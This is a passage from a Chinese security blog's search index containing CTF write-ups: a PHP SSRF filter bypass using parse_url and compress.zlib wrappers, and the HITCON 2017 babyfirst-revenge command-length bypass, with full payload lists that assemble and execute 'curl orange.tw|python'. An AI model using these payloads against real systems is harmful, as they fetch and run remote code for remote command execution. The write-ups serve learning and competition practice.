target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89426041</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一道CTF的trick分析</title>
      <link href="/4215173263.html"/>
      <url>/4215173263.html</url>
      
        <content type="html"><![CDATA[<h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h2><p>代码如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"you are hacker"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/127\.0\.0\.1$/'</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span><span class="token string">'nononono'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token string">'nonono!'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h2><p>首先看filter_var()函数的官方说明<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314224534.png" alt></p><blockquote><p>FILTER_VALIDATE_URL 过滤器把值作为 URL 来验证。<br>Name: “validate_url”<br>ID-number: 273<br>可能的标志：<br>FILTER_FLAG_SCHEME_REQUIRED - 要求 URL 是 RFC 兼容 URL（比如 <a href="http://example）" target="_blank" rel="noopener">http://example）</a><br>FILTER_FLAG_HOST_REQUIRED - 要求 URL 包含主机名（比如 <a href="http://www.example.com）" target="_blank" rel="noopener">http://www.example.com）</a><br>FILTER_FLAG_PATH_REQUIRED - 要求 URL 在域名后存在路径（比如 <a href="http://www.example.com/example1/test2/）" target="_blank" rel="noopener">www.example.com/example1/test2/）</a><br>FILTER_FLAG_QUERY_REQUIRED - 要求 URL 存在查询字符串（比如 “example.php?name=Peter&amp;age=37”）</p></blockquote><h2 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url()"></a>parse_url()</h2><p>先看官方手册<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314231824.png" alt><br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314231939.png" alt><br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314232031.png" alt><br>对于parse_url()的拆分，是有解析漏洞的，根据特定符号进行分段例如通过@分割 user 与 host<br>这样就可以伪造host<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314232827.png" alt></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先我们要post一个url，而且host是以127.0.0.1结尾，有一个题目，是要以baidu.com结尾，这就衍生了另外的思路：买域名，或者post.baidu.com跳转<br>正常情况下，利用parse_url()的解析漏洞，其实就可以绕过了，但是在后面有<code>file_get_contens</code>的情况下，我们需要传入数据让<code>file_get_contens</code>读取，因为php对于MIME不敏感，我们可以修改text来利用data://来绕过，如：<code>data://baidu.com/plain;base64,xxxxx</code>，but,data://被ban了，看了大佬们的WP，发现可以利用<code>compress.zlib://data:@127.0.0.1/palin,让file_get_contens读取的代码</code>来绕过，<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314235825.png" alt></p><p>为什么要用<code>compress.zlib://</code>没怎么弄懂，希望知道的大佬们指点一波，我分析的应该是compress.zlib://将后面的当成了要读取的文件（具体伪协议会另写一篇文章），并且根据官方手册说明</p><blockquote><p>compress.zlib://、 compress.bzip2:// 和 gzopen()、bzopen() 是相等的<br>尝试换成 compress.bzip2://试了一下，但是不知道为什么返回的全是空白（同求大佬指点）</p></blockquote><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>这道题目大概就这些知识点和trick<br>下面再附上以为师傅的关于file_get_contens获取数据的总结截图<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314235620.png" alt></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">【SSRF】如何绕过filter_var(), preg_match() 和 parse_url()</a><br><a href="https://blog.dyboy.cn/websecurity/154.html#title-3" target="_blank" rel="noopener">一道CTF题目的探究</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行绕过</title>
      <link href="/1877436815.html"/>
      <url>/1877436815.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-HITCON-2017-babyfirst-revenge"><a href="#0x01-HITCON-2017-babyfirst-revenge" class="headerlink" title="0x01 HITCON 2017 babyfirst-revenge"></a>0x01 HITCON 2017 babyfirst-revenge</h2><p>最近比遇到一个关于四字符getshell的问题，就把这道题目拿过来分析一下<br>v1代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'/bin/rm -rf '</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>看代码是需要5个字符去绕过然后执行命令，关于linux命令限制突破，在P神的<a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">《小密圈里的那些奇技淫巧》</a>早就有提到过，通过拆分来getshell<br>知识点：</p><ol><li>网络上下载文件的命令：curl、GET、wget</li><li><strong>linux可以利用<code>\</code>换行续写</strong></li><li>linux<code>&gt;</code>重定向,<code>&gt;</code>覆盖原有内容<code>&gt;&gt;</code>追加内容</li><li><strong>文件中的命令错误不影响之后命令的执行</strong></li><li>还有就是<code>ls</code>的<strong>排序问题</strong>，默认的排序方式显示符号再是数字，最后按字母顺序【注意，字母是<code>aAbB</code>这种顺序，即字母序】，而<code>ls -t</code>又超出长度限制，这就导致不得不考虑排序问题<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313000138.png" alt></li></ol><p>这样的话题目思路就很清晰了，通过拆分通过拆分payload写入文件来执行远程VPS上的文件</p><p>目前拆分思路：</p><ol><li>先将<code>ls -t</code>写进一个文件，再按照时间顺序来写入payload，最后分别执行两个文件【官方payload】如下：</li></ol><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment" spellcheck="true"># generate `ls -t>g` file</span>    <span class="token string">'>ls\\'</span><span class="token punctuation">,</span>     <span class="token string">'ls>_'</span><span class="token punctuation">,</span>     <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>     <span class="token string">'>-t\\'</span><span class="token punctuation">,</span>     <span class="token string">'>\>g'</span><span class="token punctuation">,</span>     <span class="token string">'ls>>_'</span><span class="token punctuation">,</span>     <span class="token comment" spellcheck="true"># generate `curl orange.tw|python`</span>    <span class="token string">'>on'</span><span class="token punctuation">,</span>     <span class="token string">'>th\\'</span><span class="token punctuation">,</span>     <span class="token string">'>py\\'</span><span class="token punctuation">,</span>     <span class="token string">'>\|\\'</span><span class="token punctuation">,</span>     <span class="token string">'>tw\\'</span><span class="token punctuation">,</span>    <span class="token string">'>e.\\'</span><span class="token punctuation">,</span>     <span class="token string">'>ng\\'</span><span class="token punctuation">,</span>     <span class="token string">'>ra\\'</span><span class="token punctuation">,</span>     <span class="token string">'>o\\'</span><span class="token punctuation">,</span>     <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>     <span class="token string">'>rl\\'</span><span class="token punctuation">,</span>     <span class="token string">'>cu\\'</span><span class="token punctuation">,</span>     <span class="token comment" spellcheck="true"># exec</span>    <span class="token string">'sh _'</span><span class="token punctuation">,</span>     <span class="token string">'sh g'</span><span class="token punctuation">,</span> <span class="token punctuation">]</span></code></pre><ol start="2"><li><p>直接按照顺序写，当遇到后面的优先级比前面的大的时候可以先将前面的命令写入文件，再利用<code>rm</code>命令删除，最后的时候再利用<code>&gt;&gt;</code>来追加【其实第一种也要用到这个思路】<br>【例子如下，取自<a href="https://findneo.github.io/171110Bypass4CLimit/" target="_blank" rel="noopener">payload</a>】</p><pre class=" language-python"><code class="language-python">build <span class="token operator">=</span> <span class="token punctuation">[</span>'<span class="token operator">></span>cur\'<span class="token punctuation">,</span>      '<span class="token operator">></span>l \'<span class="token punctuation">,</span>      <span class="token string">'ls>A'</span><span class="token punctuation">,</span>      <span class="token string">'rm c*'</span><span class="token punctuation">,</span>      <span class="token string">'rm l*'</span><span class="token punctuation">,</span>      '<span class="token operator">></span><span class="token number">105</span>\'<span class="token punctuation">,</span>      '<span class="token operator">></span><span class="token number">304</span>\'<span class="token punctuation">,</span>      '<span class="token operator">></span><span class="token number">301</span>\'<span class="token punctuation">,</span>      '<span class="token operator">></span><span class="token number">9</span><span class="token operator">></span>\'<span class="token punctuation">,</span>      <span class="token string">'ls>>A'</span><span class="token punctuation">,</span>      <span class="token string">'sh A'</span><span class="token punctuation">,</span>      <span class="token string">'php A'</span>      <span class="token punctuation">]</span></code></pre><p>V1到这就没什么好说的了，再看V2：<br>代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span> @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'/bin/rm -rf '</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span></code></pre></li></ol><pre><code>限制到了4个字符，首先，禁用了`&gt;&gt;`追加，在就是导致我们没法利用`rm`,即第二种拆分思路已经失效，只能采取第一种，而这就又有一个问题，那就是`ls -t`的拆分，无论怎么拆都满足不了字母序的条件。下面就是这道题目的知识点了：1. dir命令：dir等于ls -C -b;也就是说，默认情况下，文件列在列中，垂直排序，特殊字符由反斜杠转义序列表示。和ls基本一样，但是好出就是dir是d开头字典序在前。2. rev命令：将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。3. 还有就是`*`，这就是最有趣的地方了，`*`再linux中代表任意个数的通配符，但是如果单单只输入一个`*`的时候就类似于`$(dir *)`    ![](https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313013049.png)综上的话，思路就有了：思路就是V1思路的第一思路，重点在于如何写入`ls -t&gt;f`，有了上面的知识点，我们可以构造`dir f&gt; t- sl`【d的字母序必须再最前】,然后通过`*&gt;v`执行并重定向给`v`，在创建一个`rev`文件，然后通过 `*v&gt;g`执行`rev v`来将`ls -t&gt;f`写入g中再操作期间发现t的字母序要再s的后面，这就导致不能达成上面的条件![](https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313015518.png)解决方法是加多一个参数，例如h，ls只带参数h的不带参数l话那这个参数是毫无意义的，把t-换成ht-后成功满足![](https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313020234.png)在之后就是V1的思路了【官方payload】```pythonpayload = [    # generate &quot;g&gt; ht- sl&quot; to file &quot;v&quot;    &#39;&gt;dir&#39;,     &#39;&gt;sl&#39;,     &#39;&gt;g\&gt;&#39;,    &#39;&gt;ht-&#39;,    &#39;*&gt;v&#39;,    # reverse file &quot;v&quot; to file &quot;x&quot;, content &quot;ls -th &gt;g&quot;    &#39;&gt;rev&#39;,    &#39;*v&gt;x&#39;,    # generate &quot;curl orange.tw|python;&quot;    &#39;&gt;\;\\&#39;,     &#39;&gt;on\\&#39;,     &#39;&gt;th\\&#39;,     &#39;&gt;py\\&#39;,     &#39;&gt;\|\\&#39;,     &#39;&gt;tw\\&#39;,    &#39;&gt;e.\\&#39;,     &#39;&gt;ng\\&#39;,     &#39;&gt;ra\\&#39;,     &#39;&gt;o\\&#39;,     &#39;&gt;\ \\&#39;,     &#39;&gt;rl\\&#39;,     &#39;&gt;cu\\&#39;,     # got shell    &#39;sh x&#39;,     &#39;sh g&#39;, ]</code></pre><p>参考文章：</p><ul><li><a href="https://findneo.github.io/171110Bypass4CLimit/" target="_blank" rel="noopener">如何绕过四个字符限制getshell</a></li><li><a href="https://xz.aliyun.com/t/1579" target="_blank" rel="noopener">HITCON 2017 babyfirst-revenge(-v2)浅析</a></li></ul><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议分析</title>
      <link href="/3264988010.html"/>
      <url>/3264988010.html</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Please enter the password to read.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="8389d80b2e14a914ab565ae6ae3508e924f09c2bdf5a2142353e7c8806b6ce20">182006207700fc149fec831c9ae039745426c83a0620631d4a87de529b8b9e5356d615a92bb6b7f444a51004fd85089f1ac8cb7712600c813981736d80e54bbbf8b93435457f41c31b74267a436ebc7026a1c90b4563af2c1f741575ffe8dbfc4f1b783896729cbd8ebd3c591bef8fcb24276fdaea4267e58d1d01e20a0b265d96cad30f6502e4a077ecbf1a39e86deb1d4f081232501e4a926dd2055e23d07839f214ddba6f0a9bcd432996cdaa8a5266a59d3f68b3e70a3ff7fb985e0d314dbbd8e510fa39331d9422cc44cbd7d88c1c28ca329b73162cbfc246ecf6d7a5fb65317b627bd0545a22bbc64ad4cc345eedcaace21aac2822f7b5433c3f849201e7c8f292bd1ec21e77301b74f7b22d010898d123a35781d172359d9418a508aae740b2f825a7abfb7012322c836808b0b0821b10b0204321837f85d61c9f2568ffab822442676f94369697fede432518b6ee06a1c140aecd2c410bdd2382c72297a3fff545f949036838d504959b395a5fde82c42bdd7f64c9a4cd3ea1665734a2f4b9a6c6983921afd67dcc86d61e1e631d9ea63374aab16e696a4af40c5d979c1e50ef8fa1d43c55e863f409a55d70b9d9eb30ed4ef54e04207193a073ba4e04b50e897869666b05a59405d188b9421c22895e88abd0d81443a2f56a133af431b2fccd57bad2d978d4ac59a16982d0</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> php伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
